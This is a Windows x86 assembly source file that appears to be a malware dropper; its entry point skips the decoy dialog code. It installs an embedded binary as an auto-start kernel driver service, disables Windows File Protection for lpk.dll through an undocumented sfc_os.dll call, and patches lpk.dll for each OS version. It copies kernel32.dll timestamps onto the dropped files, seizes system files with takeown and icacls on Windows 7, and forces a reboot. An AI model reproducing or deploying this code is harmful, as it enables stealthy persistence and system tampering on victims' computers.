.386
.model flat,stdcall
option casemap:none

include hsbstart.inc

.code

LYQMoveMemory proc uses ebx ecx esi edi lpdest,lpsou,lpsize
	mov esi,lpsou
	mov edi,lpdest
	mov ecx,lpsize
	cld
	rep movsb
	ret
LYQMoveMemory endp

LYQCmpMemory proc uses ebx ecx esi edi lpdest,lpsou,lpsize
	mov esi,lpdest
    mov edi,lpsou
    mov ecx,lpsize
	cld
    repe cmpsb
    .if zero?
    	mov eax,1
    .else
    	mov eax,0	
    .endif
	ret
LYQCmpMemory endp

LLGPA	proc uses ebx ecx esi edi lParam,wParam
	invoke LoadLibraryEx,lParam,NULL,NULL
	invoke GetProcAddress,eax,wParam
	ret
LLGPA endp

_EnableShutdownPrivilege  proc uses ebx ecx esi edi
    local  @hToken
    local  @tp:TOKEN_PRIVILEGES
    lea eax,@hToken
    push eax
    push TOKEN_ALL_ACCESS
    invoke GetCurrentProcess
    push eax
	invoke LLGPA,addr szadvapi,CTEXT("OpenProcessToken")
	call eax
    mov  @tp.PrivilegeCount,1
    lea	eax,@tp.Privileges[0].Luid
    push eax
    push CTEXT("SeShutdownPrivilege")
    push NULL
	invoke LLGPA,addr szadvapi,CTEXT("LookupPrivilegeValueA")
    call eax
    mov  @tp.Privileges[0].Attributes,SE_PRIVILEGE_ENABLED
    push NULL
    push NULL
    mov eax,sizeof @tp
    push eax
    lea eax,@tp
    push eax
    push FALSE
    push @hToken
	invoke LLGPA,addr szadvapi,CTEXT("AdjustTokenPrivileges")
    call eax
    invoke  CloseHandle,@hToken
    ret
_EnableShutdownPrivilege  endp

GetSysDir proc uses ebx ecx esi edi wParam,lParam
	mov eax,100h
	xor eax,eax
	call @f
	@@: pop esi
	invoke LoadLibrary,CTEXT("kernel32.dll")
	mov ebx,eax
	invoke GetProcAddress,ebx,CTEXT("GetSystemDirectoryA")
	mov edi,eax
	add edi,5
	mov ebx,wParam
	mov ecx,lParam
	add esi,46
    push ecx
    push ebx
	push esi
	push ebp
	mov ebp,esp
	jmp edi
	mov eax,0
	ret
GetSysDir endp

GetVersionInfo	proc uses ebx esi edi _lpFileName:dword
	local	@dbVerInfo[4096]:byte
	local	@lpBuffer,@dwLen:dword
	local	@dwVer1,@dwVer2:dword
	invoke	GetFileVersionInfoSize,_lpFileName,NULL
	.if	!eax
		xor	eax,eax
		ret
	.endif
	invoke	GetFileVersionInfo,_lpFileName,NULL,sizeof @dbVerInfo,addr @dbVerInfo
	invoke	VerQueryValue,addr @dbVerInfo,CTEXT("\"),addr @lpBuffer,addr @dwLen
	mov	esi,@lpBuffer
	assume	esi:ptr VS_FIXEDFILEINFO
	mov	eax,[esi].dwFileVersionMS
	movzx	ebx,ax
	mov	@dwVer2,ebx
	shr	eax,16
	mov	@dwVer1,eax
	assume	esi:nothing
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,32
	mov ebx,eax
	invoke	wsprintf,ebx,CTEXT("%d.%d"),@dwVer1,@dwVer2
	mov eax,ebx
	ret
GetVersionInfo	endp

GetNamePath proc uses ebx esi edi lParam,wParam
	mov ebx,lParam
	mov edi,wParam
	call @f
	@@: pop esi
	add esi,15
    push -1
    push ebx
    push 0
	push esi
	push ebp
	mov ebp,esp
	jmp edi
	mov eax,0
	ret
GetNamePath endp

babanihaihaoma proc uses ebx esi edi 
	LOCAL	@hresinfo,@dwressize,@lpres,@hfile,@bufsize:dword
	LOCAL	@ft1:FILETIME
	LOCAL 	@ft2:FILETIME
	LOCAL 	@ft3:FILETIME
	LOCAL   @lsbytes[MAX_PATH]:byte
	invoke GetSysDir,addr @lsbytes,MAX_PATH
	invoke lstrcat,addr @lsbytes,CTEXT("\kernel32.dll")
	invoke CreateFile,addr @lsbytes,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
	mov @hfile,eax
	invoke GetFileTime,@hfile,addr @ft1,addr @ft2,addr @ft3
	invoke CloseHandle,@hfile	
	invoke GetSysDir,addr @lsbytes,MAX_PATH
	invoke lstrcat,addr @lsbytes,CTEXT("\vmhdc32.dll")
	mov @dwressize,14848
	mov ebx,offset mzcode
	mov dword ptr[ebx],00905A4Dh
	invoke CreateFile,addr @lsbytes,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
	mov @hfile,eax
	invoke SetFileTime,@hfile,addr @ft1,addr @ft2,addr @ft3
	invoke WriteFile,@hfile,addr mzcode,@dwressize,addr @bufsize,NULL
	invoke CloseHandle,@hfile
	ret
babanihaihaoma endp

win7cmd	proc uses ebx ecx esi edi lParam,wParam
	LOCAL	@hfile,@bufsize,@filesize,@lsls
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
	mov @lsls,eax
	invoke lstrcat,@lsls,CTEXT("/c takeown /f ")
	invoke lstrcat,@lsls,lParam
	invoke lstrcat,@lsls,CTEXT(" & icacls ")
	invoke lstrcat,@lsls,lParam
	invoke lstrcat,@lsls,CTEXT(" /grant administrators:F /t")
	invoke ShellExecute,NULL,CTEXT("open"),CTEXT("cmd"),@lsls,NULL,SW_SHOWNORMAL
	invoke Sleep,3777
	invoke RtlZeroMemory,@lsls,MAX_PATH
	invoke GetWindowsDirectory,@lsls,MAX_PATH
	invoke lstrcat,@lsls,CTEXT("\system32\_bakadv")
	invoke MoveFileEx,lParam,@lsls,MOVEFILE_REPLACE_EXISTING
	invoke RtlZeroMemory,@lsls,MAX_PATH
	invoke lstrcat,@lsls,CTEXT("/c move ")
	invoke lstrcat,@lsls,wParam
	invoke lstrcat,@lsls,CTEXT(" ")
	invoke RtlZeroMemory,lParam,MAX_PATH
	invoke GetWindowsDirectory,lParam,MAX_PATH
	invoke lstrcat,lParam,CTEXT("\system32")
	invoke lstrcat,@lsls,lParam
	invoke ShellExecute,NULL,CTEXT("open"),CTEXT("cmd"),@lsls,NULL,SW_SHOWNORMAL
	invoke Sleep,3777
	ret
win7cmd endp

GoHome proc uses ebx esi edi
	LOCAL	@lsls,@hresinfo,@dwressize,@lpres,@hfile,@bufsize:dword
	LOCAL	@hrfile,@filesize,@lpbanben:dword
	LOCAL	@ft1:FILETIME
	LOCAL 	@ft2:FILETIME
	LOCAL 	@ft3:FILETIME
	LOCAL   @pathstr[MAX_PATH]:byte
	LOCAL   @lsbytes[MAX_PATH]:byte
	invoke GetSysDir,addr @lsbytes,MAX_PATH
	invoke lstrcat,addr @lsbytes,CTEXT("\tempss")
	invoke GetSysDir,addr @pathstr,MAX_PATH
	invoke lstrcat,addr @pathstr,CTEXT("\lpk.dll")
	invoke GetVersionInfo,addr @pathstr
	mov @lpbanben,eax
	invoke CreateFile,addr @pathstr,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
	mov @hfile,eax
	invoke GetFileTime,@hfile,addr @ft1,addr @ft2,addr @ft3
	invoke GetFileSize,@hfile,NULL
	mov @dwressize,eax
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,@dwressize
	mov @lsls,eax
	invoke ReadFile,@hfile,@lsls,@dwressize,addr @bufsize,NULL
	invoke CloseHandle,@hfile
	invoke lstrcmpi,CTEXT("5.1"),@lpbanben
	.if eax==0
		mov ebx,@lsls
		add ebx,22b2h
		invoke RtlMoveMemory,ebx,addr axpsp,6
		mov ebx,@lsls
		add ebx,4b2ah
		invoke RtlMoveMemory,ebx,addr bxpsp,41
		invoke MoveFileEx,addr @pathstr,addr @lsbytes,MOVEFILE_REPLACE_EXISTING
		invoke CreateFile,addr @pathstr,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov @hfile,eax
		invoke SetFileTime,@hfile,addr @ft1,addr @ft2,addr @ft3
		invoke WriteFile,@hfile,@lsls,@dwressize,addr @bufsize,NULL
		invoke CloseHandle,@hfile
		invoke GlobalFree,@lsls
		invoke babanihaihaoma
	.endif
	invoke lstrcmpi,CTEXT("5.2"),@lpbanben
	.if eax==0
		mov ebx,@lsls
		add ebx,22b2h
		invoke RtlMoveMemory,ebx,addr a2003sp,5
		mov ebx,@lsls
		add ebx,4b8bh
		invoke RtlMoveMemory,ebx,addr b2003sp,36
		invoke MoveFileEx,addr @pathstr,addr @lsbytes,MOVEFILE_REPLACE_EXISTING
		invoke CreateFile,addr @pathstr,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov @hfile,eax
		invoke SetFileTime,@hfile,addr @ft1,addr @ft2,addr @ft3
		invoke WriteFile,@hfile,@lsls,@dwressize,addr @bufsize,NULL
		invoke CloseHandle,@hfile
		invoke GlobalFree,@lsls
		invoke babanihaihaoma
	.endif
	invoke lstrcmpi,CTEXT("6.1"),@lpbanben
	.if eax==0
		mov ebx,@lsls
		add ebx,96Ch
		invoke RtlMoveMemory,ebx,addr awin7,5
		mov ebx,@lsls
		add ebx,5DA9h
		invoke RtlMoveMemory,ebx,addr bwin7,58
		invoke RtlZeroMemory,addr @lsbytes,MAX_PATH
		invoke GetWindowsDirectory,addr @lsbytes,MAX_PATH
		invoke lstrcat,addr @lsbytes,CTEXT("\lpk.dll")
		invoke CreateFile,addr @lsbytes,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov @hfile,eax
		invoke SetFileTime,@hfile,addr @ft1,addr @ft2,addr @ft3
		invoke WriteFile,@hfile,@lsls,@dwressize,addr @bufsize,NULL
		invoke CloseHandle,@hfile
		invoke GlobalFree,@lsls
		invoke win7cmd,addr @pathstr,addr @lsbytes
		invoke babanihaihaoma
	.endif	
	ret
GoHome endp

StartProc proc uses ebx ecx esi edi
	LOCAL	@lpundir,@lpSfcFileException:dword
	LOCAL	@lsbytes[MAX_PATH]:byte
	invoke GetSysDir,addr @lsbytes,MAX_PATH
	invoke lstrcat,addr @lsbytes,CTEXT("\lpk.dll")
	invoke MultiByteToWideChar,CP_ACP,0,addr @lsbytes,-1,0,0
    mov ecx,2
    mul ecx
    mov ebx,eax
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,ebx
	mov @lpundir,eax
	invoke MultiByteToWideChar,CP_ACP,0,addr @lsbytes,-1,@lpundir,ebx
	invoke LoadLibrary,CTEXT("sfc_os.dll")
	invoke GetProcAddress,eax,5
    mov @lpSfcFileException,eax
    add @lpSfcFileException,5
    invoke GetNamePath,@lpundir,@lpSfcFileException
    invoke GlobalFree,@lpundir
	invoke GoHome
	invoke _EnableShutdownPrivilege
	invoke ExitWindowsEx,EWX_REBOOT,NULL
	ret
StartProc endp

InstallSYS proc uses ebx ecx esi edi
	LOCAL	@hfile,@hd,@hdsc,@bufsize,@lsls	
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH*2
	mov @lsls,eax
	invoke GetWindowsDirectory,@lsls,MAX_PATH
	invoke lstrcat,@lsls,CTEXT("\system32\drivers\vmhdc32.sys")
	invoke CreateFile,@lsls,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
	mov @hfile,eax
	mov ebx,offset mzcodesys
	mov dword ptr[ebx],00905A4Dh
	invoke WriteFile,@hfile,ebx,6144,addr @bufsize,NULL
	invoke CloseHandle,@hfile
;	@@:
	invoke OpenSCManager,NULL,NULL,02h
	.if eax
		mov @hdsc,eax
		invoke OpenService,@hdsc,CTEXT("vmhdc32sys"),SERVICE_START or SERVICE_STOP
		.if eax
			mov @hd,eax
			invoke StartService,@hd,NULL,NULL
			invoke CloseServiceHandle,@hd
		.else
			invoke CreateService,@hdsc,CTEXT("vmhdc32sys"),CTEXT("vmhdc32sys"),SERVICE_START or SERVICE_STOP,SERVICE_KERNEL_DRIVER,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,@lsls,NULL,NULL,NULL,NULL,NULL
			.if eax
				mov @hd,eax
				invoke StartService,@hd,NULL,NULL
				invoke CloseServiceHandle,@hd
			.endif
		.endif
		invoke CloseServiceHandle,@hdsc
	.endif
;	invoke CreateFile,CTEXT("\\.\hsbsys0"),GENERIC_READ or GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
;	mov ebx,eax
;	.if ebx==INVALID_HANDLE_VALUE
;		invoke Sleep,3000
;		jmp @b
;	.endif
;	invoke CloseHandle,ebx
	invoke Sleep,3000
	invoke StartProc
	ret
InstallSYS endp

start:

	invoke GetModuleHandle,NULL
	mov hInstance,eax
	invoke GetCommandLine
	invoke InitCommonControls
	mov	CommandLine,eax
	invoke InstallSYS
	invoke ExitProcess,0

WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD
	LOCAL	wc:WNDCLASSEX
	LOCAL	msg:MSG

	mov		wc.cbSize,sizeof WNDCLASSEX
	mov		wc.style,CS_HREDRAW or CS_VREDRAW
	mov		wc.lpfnWndProc,offset WndProc
	mov		wc.cbClsExtra,NULL
	mov		wc.cbWndExtra,DLGWINDOWEXTRA
	push	hInst
	pop		wc.hInstance
	mov		wc.hbrBackground,COLOR_BTNFACE+1
	mov		wc.lpszMenuName,IDM_MENU
	mov		wc.lpszClassName,offset ClassName
	invoke LoadIcon,NULL,IDI_APPLICATION
	mov		wc.hIcon,eax
	mov		wc.hIconSm,eax
	invoke LoadCursor,NULL,IDC_ARROW
	mov		wc.hCursor,eax
	invoke RegisterClassEx,addr wc
	invoke CreateDialogParam,hInstance,IDD_DIALOG,NULL,addr WndProc,NULL
	invoke ShowWindow,hWnd,SW_SHOWNORMAL
	invoke UpdateWindow,hWnd
	.while TRUE
		invoke GetMessage,addr msg,NULL,0,0
	  .BREAK .if !eax
		invoke TranslateMessage,addr msg
		invoke DispatchMessage,addr msg
	.endw
	mov		eax,msg.wParam
	ret

WinMain endp

WndProc proc hWin:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM

	mov		eax,uMsg
	.if eax==WM_INITDIALOG
		push	hWin
		pop		hWnd
	.elseif eax==WM_COMMAND
		mov		eax,wParam
		and		eax,0FFFFh
		.if eax==IDM_FILE_EXIT
			invoke SendMessage,hWin,WM_CLOSE,0,0
		.elseif eax==IDM_HELP_ABOUT
			invoke ShellAbout,hWin,addr AppName,addr AboutMsg,NULL
		.endif
;	.elseif eax==WM_SIZE
	.elseif eax==WM_CLOSE
		invoke DestroyWindow,hWin
	.elseif uMsg==WM_DESTROY
		invoke PostQuitMessage,NULL
	.else
		invoke DefWindowProc,hWin,uMsg,wParam,lParam
		ret
	.endif
	xor    eax,eax
	ret

WndProc endp

end start
